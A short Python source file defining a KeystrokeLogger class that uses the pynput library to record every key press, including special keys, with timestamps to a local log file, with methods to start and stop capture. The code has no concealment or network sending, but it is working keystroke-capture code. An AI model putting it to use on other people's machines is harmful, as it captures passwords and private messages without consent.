import logging
import os
from pynput import keyboard

class KeystrokeLogger:
    def __init__(self, log_file='keystrokes.log'):
        """
        Initialize the KeystrokeLogger.
        
        :param log_file: Path to the log file where keystrokes will be recorded
        """
        # Ensure log directory exists
        os.makedirs(os.path.dirname(log_file) or '.', exist_ok=True)
        
        # Configure logging
        logging.basicConfig(
            filename=log_file, 
            level=logging.INFO, 
            format='%(asctime)s - %(message)s'
        )
        self.log_file = log_file
        self.listener = None

    def on_press(self, key):
        """
        Callback method for key press events.
        
        :param key: The key that was pressed
        """
        try:
            # Try to log the character representation of the key
            logging.info(f'Key pressed: {key.char}')
        except AttributeError:
            # For special keys (like shift, ctrl, etc.) use their string representation
            logging.info(f'Special key pressed: {key}')

    def start_logging(self):
        """
        Start logging keystrokes.
        
        :return: True if logging started successfully
        """
        try:
            # Create a listener for keyboard events
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            return True
        except Exception as e:
            logging.error(f'Failed to start logging: {e}')
            return False

    def stop_logging(self):
        """
        Stop logging keystrokes.
        
        :return: True if logging stopped successfully
        """
        try:
            if self.listener:
                self.listener.stop()
                return True
            return False
        except Exception as e:
            logging.error(f'Failed to stop logging: {e}')
            return False

    def get_log_file_path(self):
        """
        Get the path to the log file.
        
        :return: Path to the log file
        """
        return self.log_file